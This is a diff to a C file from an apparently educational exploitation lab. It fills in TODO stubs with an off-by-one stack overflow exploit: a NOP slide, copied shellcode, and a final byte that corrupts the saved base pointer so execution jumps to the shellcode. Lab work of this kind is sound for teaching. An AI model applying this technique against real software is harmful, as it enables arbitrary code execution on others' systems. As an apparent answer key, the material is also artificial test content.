@@ -8,10 +8,20 @@
 
 int main(int argc, char *argv[])
 {
-  // TODO determine size of exploit
-  char exploit[0];
+  // Determine size of exploit
+  // As we have "int i = 0; i <= len; i++" in the target2.c,
+  // so we can add 1 more byte to overwrite the saved RBP.
+  char exploit[129];
 
-  // TODO fill exploit buffer
+  // Fill exploit buffer with NOP slide
+  // As we have NOP slide, we can just put the shellcode
+  // inside the exploit string. Then set the last byte of
+  // exploit string to another value to ruin the rbp.
+  // After we ruin the rbp, the rip of foo() would point to
+  // the local var of main() where contains our shellcode.
+  memset(exploit, '\x90', sizeof(exploit));
+  memcpy(exploit + 10, shellcode, sizeof(shellcode) - 1);
+  *(exploit + 128) = 0x00;
 
   // Write the exploit buffer to a file
   write_xploit(exploit, sizeof(exploit), DEFAULT_OUTPUT);
